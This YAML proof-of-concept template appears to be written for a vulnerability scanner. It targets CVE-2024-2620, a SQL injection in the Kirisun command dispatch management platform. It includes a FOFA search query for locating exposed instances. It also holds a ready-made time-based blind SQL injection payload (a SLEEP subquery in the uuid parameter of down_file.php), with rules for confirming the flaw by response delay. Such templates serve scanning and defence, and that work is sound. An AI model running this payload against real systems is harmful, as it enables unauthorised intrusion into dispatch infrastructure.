id: poc-yaml-kirisun-command-scheduling-management-platform-sqli
info:
  name: 福建科立讯通信 指挥调度管理平台 SQL注入漏洞(CVE-2024-2620)
  severity: high
  tags:
  - CVE-2024-2620
  - SQL注入
  finger: 科立讯指挥调度管理平台
  fofa: body="指挥调度管理平台"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /api/client/down_file.php?uuid=1%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP({{.t1}})))pwaA)%20AND%20%27dDhF%27=%27dDhF
  expression: 'status_code == 200 &&

    body == "数据库没有此记录" &&

    duration > t1 &&

    duration < t2

    '
transport: http
